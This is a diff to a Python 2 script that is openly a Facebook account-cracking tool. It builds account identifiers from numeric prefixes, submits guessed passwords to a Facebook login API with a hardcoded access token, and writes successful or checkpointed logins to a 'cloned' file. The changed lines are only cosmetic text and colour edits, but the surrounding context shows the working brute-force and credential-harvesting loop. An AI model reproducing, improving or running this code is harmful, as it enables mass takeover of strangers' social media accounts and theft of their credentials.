@@ -202,7 +202,7 @@ def action():
         os.system("clear")
         print logo2
         print "\x1b[1;33m(1) 2004-2009 [Enter - 00]"+'\n'
-        print '\x1b[1;35mEnter only 00 TO CLONE 2004-2009 ACCOUNT'
+        print '\x1b[1;35mENTER ONLY 00 TO CLONING 2004-2009 ACCOUNT'
         try:
             c = raw_input("\033[1;95mCHOOSE : ")
             k="1000"
@@ -220,8 +220,8 @@ def action():
         action()
     print 50* '\033[1;93m-'
     xxx = str(len(id))
-    jalan ('\033[1;34mTOTAL OLD ID NUMBER: '+xxx)
-    jalan ('\033[1;35mCODE YOU CHOOSE '+c)
+    jalan ('\033[1;93mTOTAL OLD ID NUMBER : '+xxx)
+    jalan ('\033[1;96mCODE YOU CHOOSE '+c)
     jalan ("\033[1;31mWait A While \x1b[1;32mStart Cracking...")
     jalan ("\033[1;32mTo Stop Process Press Ctrl+z")
     print 50* '\033[1;93m-'
@@ -237,7 +237,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m(PSYCHO-CP)  ' + k + c + user + '  |  ' + pass1 +     '\x1b[1;92m(Login 7 Days)\x1b[0m \n'                           
+                print '\x1b[1;91m(PSYCHO-CP)  ' + k + c + user + '  |  ' + pass1 +     '\x1b \x1b[0m \n'                           
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
@@ -255,7 +255,7 @@ def action():
     print 'Process Has Been Completed ...'
     print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
     print('Cloned Accounts Has Been Saved : save/cloned.txt')
-    jalan("Note : Your Offline account Will Open after 3 days")
+    jalan("Note : Your Offline account Will Open after 3-7 days")
     print ''
     print """
     PSYCHO PICCHI \033[1;95mFb\033[1;97m 
